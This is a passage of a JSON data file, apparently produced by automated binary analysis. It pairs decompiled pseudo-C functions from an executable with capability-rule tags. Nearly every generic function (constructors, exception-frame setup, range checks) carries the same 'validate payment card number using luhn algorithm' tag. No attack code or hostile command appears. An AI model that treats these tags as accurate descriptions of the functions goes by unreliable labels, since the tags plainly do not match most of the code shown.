        "decompiled_code": "\nvoid __fastcall fcn.0046c314(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x46c32f;\n    cVar1 = fcn.004039b8();\n    if (cVar1 == '\\0') {\n        puStack28 = 0x46c42d;\n        fcn.0041cae8();\n        return;\n    }\n    if (in_EAX[1] != NULL) {\n        puStack28 = 0x46c346;\n        (**(*in_EAX[1] + 0x20))();\n    }\n    uStack32 = 0x46c41c;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    (**(*in_EAX + 0x18))();\n    fcn.0046c1d8();\n    fcn.0046c238();\n    fcn.0046c25c();\n    fcn.0046c1f8();\n    fcn.0046c1c4();\n    *(in_EAX + 8) = *(param_2 + 0x20);\n    cVar1 = fcn.0046c2e0();\n    if (cVar1 != '\\0') {\n        fcn.0046c2a8();\n        fcn.0041d190();\n    }\n    cVar1 = fcn.0046c2e0();\n    if (cVar1 != '\\0') {\n        fcn.0046c2a8();\n        iVar2 = fcn.0041d234();\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar3 = fcn.0046c300();\n                fcn.0046c2a8();\n                fcn.0046c8dc();\n                (**(*piVar3 + 8))();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x46c42d;\n    if (in_EAX[1] != NULL) {\n        uStack32 = 0x46c41b;\n        (**(*in_EAX[1] + 0x24))();\n    }\n    return;\n}\n",
        "token_count": 586
    },
    "0046c924": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0046c924(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.004037f0();\n    *(in_EAX + 4) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 159
    },
    "0046ca6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0046ca6c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x30) = param_1;\n    fcn.004037f0();\n    *(in_EAX + 0x2c) = in_EAX;\n    *(in_EAX + 0x28) = fcn.0046cb84;\n    *(in_EAX + 0x34) = 1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 221
    },
    "0046cc78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046cc78(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uint *in_FS_OFFSET;\n    int32_t arg_8h_00;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack72 = &stack0xfffffffc;\n    var_14h = 0;\n    var_18h = 0;\n    uStack76 = 0x46ce1a;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    var_4h = in_EAX;\n    var_1ch = fcn.0041d234();\n    if (-1 < var_1ch + -1) {\n        var_10h = 0;\n        do {\n            iVar2 = fcn.0046c8dc();\n            fcn.004048d4();\n            (**(**(arg_8h + -4) + 0x3c))();\n            cVar1 = fcn.0046c2e0();\n            if (cVar1 != '\\0') {\n                if (*(iVar2 + 0x21) == '\\x1b') {\n                    fcn.0046c2a8();\n                    iVar2 = fcn.0046c8dc();\n                    iVar3 = fcn.0046c238();\n                    if (-1 < iVar3 + -1) {\n                        var_ch = 0;\n                        do {\n                            fcn.00409998(&fcn.0046cc78::var_18h);\n                            (**(**(arg_8h + -4) + 0x3c))();\n                            if (*(iVar2 + 0x21) == '\\x1a') {\n                                arg_8h_00 = arg_8h;\n                                uVar4 = fcn.0046c2a8();\n                                fcn.004048d4(uVar4);\n                                fcn.0046cc78(arg_8h_00);\n                            }\n                            var_ch = var_ch + 1;\n                            iVar3 = iVar3 + -1;\n                        } while (iVar3 != 0);\n                    }\n                }\n                else if ((*(iVar2 + 0x22) & 0x10) == 0) {\n                    uVar5 = fcn.0046c2a8(arg_8h);\n                    uVar4 = *(iVar2 + 0xc);\n                    fcn.00404948(0x46ce40, uVar4, var_4h, uVar5);\n                    fcn.0046cc78(uVar4);\n                }\n                else {\n                    iVar2 = arg_8h;\n                    fcn.0046c2a8();\n                    fcn.0046cc78(iVar2);\n                }\n            }\n            var_10h = var_10h + 1;\n            var_1ch = var_1ch + -1;\n        } while (var_1ch != 0);\n    }\n    *in_FS_OFFSET = uStack80;\n    puStack72 = 0x46ce21;\n    uStack76 = 0x46ce0c;\n    fcn.004045ec();\n    uStack76 = 0x46ce19;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 844
    },
    "0046ceac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046ceac(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x46cf3d;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.0046d190();\n            fcn.0046de10();\n            (**(**(arg_8h + -4) + 0x3c))();\n            if (*(iVar1 + 0x40) - 0x1aU < 2) {\n                fcn.0046ceac(arg_8h);\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x46cf44;\n    uStack36 = 0x46cf3c;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 316
    },
    "0046cf68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0046cf68(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.004037f0();\n    *(in_EAX + 4) = uVar1;\n    *(in_EAX + 8) = param_1;\n    *(in_EAX + 0x18) = *0x46cfb4;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 210
    },
    "0046d114": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046d114(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack36 = 0x46d180;\n    iStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    arg_8h = &fcn.0046d114::var_4h;\n    fcn.0040675c();\n    fcn.00409998(arg_8h);\n    fcn.0046bba0();\n    *in_FS_OFFSET = arg_8h;\n    uStack36 = 0x46d187;\n    iStack40 = 0x46d17f;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 230
    },
    "0046d1f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046d1f0(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x46d27d;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puVar1 = &stack0xfffffffc;\n    if (param_2 == 0) {\n        fcn.0040675c();\n        fcn.0046bba0();\n        puVar1 = puStack32;\n    }\n    puStack32 = puVar1;\n    arg_8h = 0x46d237;\n    iVar2 = fcn.0046d2fc();\n    if (iVar2 != 0) {\n        arg_8h = *(in_EAX + 8);\n        fcn.0040675c();\n        fcn.0046bc4c(arg_8h);\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack36 = 0x46d284;\n    uStack40 = 0x46d27c;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 339
    },
    "0046d28c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0046d28c(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x46d2ed;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    while( true ) {\n        iVar1 = fcn.00404888();\n        if (iVar1 < 1) break;\n        fcn.0046bca8();\n        fcn.0046d340();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x46d2f4;\n    uStack28 = 0x46d2ec;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 207
    },
    "0046d340": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046d340(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x46d3ac;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    arg_8h = 0x46d369;\n    iVar1 = fcn.0046d2fc();\n    if (iVar1 == 0) {\n        arg_8h = *(in_EAX + 8);\n        fcn.0040675c();\n        fcn.0046bc4c(arg_8h);\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack36 = 0x46d3b3;\n    uStack40 = 0x46d3ab;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 253
    },
    "0046d458": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0046d458(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *puVar2;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0042273c();\n    *(in_EAX + 0x44) = 1;\n    puVar2 = 0x46d4b4;\n    puVar3 = in_EAX + 0x9c;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *(in_EAX + 0x94) = *0x46d4d4;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 283
    },
    "0046d520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0046d520(uint param_1, uint param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x46d58a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack44;\n    fcn.0046dd78();\n    var_10h = 0;\n    var_ch._0_1_ = 0xb;\n    var_4h._0_1_ = 0xb;\n    uVar1 = 1;\n    var_8h = param_2;\n    fcn.0040c9d4(1, &var_10h);\n    *in_FS_OFFSET = uVar1;\n    uStack44 = 0x46d591;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 261
    },
    "0046d840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046d840(uint param_1, int32_t *param_2)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar4 = 0x46ebc4;\n    fcn.0046d778(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar4);\n    uVar3 = 0x46e09c;\n    uVar2 = 0x46ebd0;\n    uVar4 = in_EAX;\n    uVar1 = in_EAX;\n    fcn.0046d7b8(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar2, uVar4, uVar3, uVar1);\n    uVar2 = 0x46e0b4;\n    uVar1 = 0x46ebdc;\n    uVar4 = in_EAX;\n    fcn.0046d7fc(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar1, in_EAX, uVar2, uVar4);\n    return;\n}\n",
        "token_count": 277
    },
    "0046e2a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046e2a8(int64_t param_1)\n\n{\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + 0xa4))(param_1 / *0x46e2d0);\n    return;\n}\n",
        "token_count": 58
    },
    "0046e3cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046e3cc(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x46e491;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x46e3f7;\n    cVar1 = fcn.00415b20();\n    if (cVar1 == '\\0') {\n        uStack56 = 0x46e42d;\n        uStack60 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc4;\n        puStack52 = &stack0xfffffffc;\n        (**(*in_EAX + 0xcc))();\n        *in_FS_OFFSET = uStack60;\n    }\n    else {\n        puStack52 = 0x46e406;\n        (**(*in_EAX + 0xd0))();\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x46e498;\n    uStack44 = 0x46e490;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 326
    },
    "0046e4a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0046e4a0(void)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x46e55a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    cVar1 = fcn.00415e1c();\n    if (cVar1 != '\\0') {\n        iVar3 = fcn.00415d74();\n        if (iVar3 == 1) {\n            uVar2 = fcn.00415a6c();\n            if ((uVar2 & 0xfff) == 0x11) {\n                iVar3 = fcn.00415dc0();\n                arg_8h = 0x46e4fe;\n                iVar4 = (**(*in_EAX + 0x70))();\n                if (iVar3 <= iVar4) goto code_r0x0046e534;\n            }\n        }\n    }\n    arg_8h = 0;\n    fcn.0046dd78();\n    var_8h = 0;\n    var_4h._0_1_ = 0xb;\n    fcn.0040675c(&fcn.0046e4a0::var_8h);\n    fcn.0046bc4c(arg_8h);\ncode_r0x0046e534:\n    fcn.0046e578();\n    *in_FS_OFFSET = arg_8h;\n    uStack40 = 0x46e561;\n    uStack44 = 0x46e559;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 458
    },
    "0046ebfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0046ebfc(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0046d458();\n    fcn.0046e7bc();\n    iVar1 = (**(*in_EAX + 0x88))();\n    if (iVar1 == 0) {\n        (**(*in_EAX + 0xc4))();\n    }\n    *(in_EAX + 0xe1) = 1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 210
    },
    "0046ed6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046ed6c(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x46edb4;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    (**(*in_EAX + 0x60))();\n    fcn.0040bfd4();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x46edbb;\n    uStack28 = 0x46edb3;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 169
    },
    "0046edc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046edc4(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x46ee0c;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    (**(*in_EAX + 0x60))();\n    fcn.0040a540();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x46ee13;\n    uStack28 = 0x46ee0b;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 171
    },
    "0046f1fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046f1fc(double param_1)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint arg_8h;\n    uint uVar2;\n    ushort uVar3;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x46f247;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack24;\n    fVar1 = param_1;\n    arg_8h = SUB104(fVar1, 0);\n    uVar2 = fVar1 >> 0x20;\n    uVar3 = fVar1 >> 0x40;\n    fcn.0040a3c0(arg_8h);\n    (**(*in_EAX + 0xb0))(arg_8h, uVar2, uVar3);\n    *in_FS_OFFSET = arg_8h;\n    fcn.004045c8(0xf24e);\n    return;\n}\n",
        "token_count": 250
    },
    "0046f5f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046f5f4(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    var_4h = param_2;\n    iVar1 = (**(*in_EAX + 0x88))();\n    iVar2 = fcn.00404e40();\n    if (iVar1 < iVar2) {\n        (**(*in_EAX + 0x88))(&var_8h);\n        fcn.00404ed0(arg_8h);\n        fcn.0046e578();\n    }\n    else {\n        fcn.0046e578();\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404cd4();\n    return;\n}\n",
        "token_count": 237
    },
    "0046f6d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0046f6d8(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0046d458();\n    fcn.0046e568();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 142
    },
    "0046f718": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0046f718(uint arg_8h, uint noname_1, uint noname_2, uint arg_14h, uint noname_4, uint noname_5, uint arg_20h)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_28h;\n    uint var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x46f7a5;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    arg_8h_00 = 0;\n    var_20h = &fcn.0046f718::arg_20h;\n    var_1ch._0_1_ = 3;\n    fcn.0046dd78();\n    var_18h = 0;\n    var_14h._0_1_ = 0xb;\n    var_10h = &fcn.0046f718::arg_14h;\n    var_ch._0_1_ = 3;\n    var_8h = &fcn.0046f718::arg_8h;\n    var_4h._0_1_ = 3;\n    fcn.0040675c(&fcn.0046f718::var_20h);\n    fcn.0046bc4c(arg_8h_00);\n    *in_FS_OFFSET = arg_8h_00;\n    uStack56 = 0x46f7ac;\n    uStack60 = 0x46f7a4;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 449
    },
    "0046f814": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0046f814(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *puVar2;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0046f6d8();\n    fcn.0046e7bc();\n    *(in_EAX + 0xe8) = 0x80000000;\n    *(in_EAX + 0xec) = 0x7fffffff;\n    puVar2 = 0x46f87c;\n    puVar3 = in_EAX + 0x9c;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 294
    },
    "0046f89c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046f89c(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t in_EDX;\n    float10 fVar1;\n    float10 fVar2;\n    ushort in_stack_ffffffce;\n    ushort in_stack_ffffffda;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((in_EDX < in_ECX) || (arg_8h < in_EDX)) {\n        fVar1 = in_ECX;\n        fVar2 = arg_8h;\n        fcn.0046f718(SUB104(fVar2, 0), fVar2 >> 0x20, CONCAT22(in_stack_ffffffce, fVar2 >> 0x40), SUB104(fVar1, 0), \n                     fVar1 >> 0x20, CONCAT22(in_stack_ffffffda, fVar1 >> 0x40), SUB104(in_EDX, 0));\n    }\n    return;\n}\n",
        "token_count": 225
    },
    "0046fd38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0046fd38(uint32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, uint32_t arg_18h, int32_t arg_1ch)\n\n{\n    float10 fVar1;\n    float10 fVar2;\n    ushort in_stack_ffffffe2;\n    ushort in_stack_ffffffee;\n    \n    if (arg_1ch == arg_14h) {\n        if (arg_18h < arg_10h) goto code_r0x0046fd65;\n    }\n    else if (arg_1ch < arg_14h) goto code_r0x0046fd65;\n    if (arg_1ch == arg_ch) {\n        if (arg_18h <= arg_8h) {\n            return;\n        }\n    }\n    else if (arg_1ch <= arg_ch) {\n        return;\n    }\ncode_r0x0046fd65:\n    fVar1 = CONCAT44(arg_14h, arg_10h);\n    fVar2 = CONCAT44(arg_ch, arg_8h);\n    fcn.0046f718(SUB104(fVar2, 0), fVar2 >> 0x20, CONCAT22(in_stack_ffffffe2, fVar2 >> 0x40), SUB104(fVar1, 0), \n                 fVar1 >> 0x20, CONCAT22(in_stack_ffffffee, fVar1 >> 0x40), SUB104(CONCAT44(arg_1ch, arg_18h), 0));\n    return;\n}\n",
        "token_count": 349
    },
    "0046fdd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0046fdd8(void)\n\n{\n    char cVar1;\n    uint uStack12;\n    uint uStack8;\n    \n    cVar1 = fcn.0046ff7c();\n    if (cVar1 == '\\0') {\n        uStack12 = 0;\n        uStack8 = 0;\n    }\n    return CONCAT44(uStack8, uStack12);\n}\n",
        "token_count": 88
    },
    "00470478": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00470478(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x47052a;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    if (param_2 == 0) {\n        puStack56 = &stack0xfffffffc;\n        (**(*in_EAX + 0xd0))();\n    }\n    else {\n        fcn.00404a88();\n        cVar1 = fcn.0040a2ac();\n        if (cVar1 == '\\0') {\n            arg_8h = 0;\n            fcn.0046dd78();\n            fcn.0040675c();\n            fcn.0046bc4c(arg_8h);\n        }\n        (**(*in_EAX + 0xa4))(_var_10h);\n    }\n    